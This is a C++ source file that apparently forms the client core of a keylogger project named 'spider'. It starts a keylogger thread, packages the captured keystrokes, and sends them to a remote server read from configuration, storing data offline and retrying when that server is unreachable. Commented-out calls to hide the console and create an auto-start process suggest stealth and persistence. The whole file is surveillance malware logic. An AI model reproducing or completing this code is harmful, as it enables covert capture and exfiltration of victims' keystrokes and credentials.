#include "Client.hpp"
#include <thread>

namespace spider
{
	namespace client
	{

		Client::Client(const std::string& id) :
			_id(id),
			_dataQueue(std::make_shared<DataQueue>()),
			_sendingQueue(std::make_shared<SendingQueue>()),
			_threadKeylogger(&Client::startKeylogger, this),
			_threadPacketFactory(&Client::startPacketFactory, this),
			_threadPacketLog(&Client::startPacketLog, this)
		{
			std::cout << "ID Client: " << _id << std::endl;

			// Create auto load process
			/*FreeConsole();
			_exe.createAutoProcess();*/
		}

		Client::~Client()
		{
			_threadKeylogger.join();
			_threadPacketFactory.join();
			_threadPacketLog.join();
		}
		void Client::startKeylogger()
		{
			_keylogger = Keylogger(_id, _dataQueue);
			_keylogger.startThread();
		}

		void Client::startPacketFactory()
		{
			_packetFactory = PacketFactory(_dataQueue, _sendingQueue);
			_packetFactory.run();
		}

		void Client::startPacketLog()
		{
			_currentServer = std::make_shared<CurrentServer>(
				_sendingQueue,
				_configManager.getDns(),
				_configManager.getPort()
				);

			_offlineManager = std::make_shared<OfflineManager>(
				_sendingQueue
				);

			_currentServer->start();
			
			bool serverOnline = _currentServer->isOnline();
			while (true) {
				if (!serverOnline) {
					_offlineManager->stock();

					// Testing reconnection
					_currentServer->start();
					serverOnline = _currentServer->isOnline();
					if (serverOnline) {
						//_offlineManager->pop();
					}
				} else {
					std::cout << "Server online." << std::endl;
					_currentServer->run();
					serverOnline = false;
				}
			}
		}


	}
}
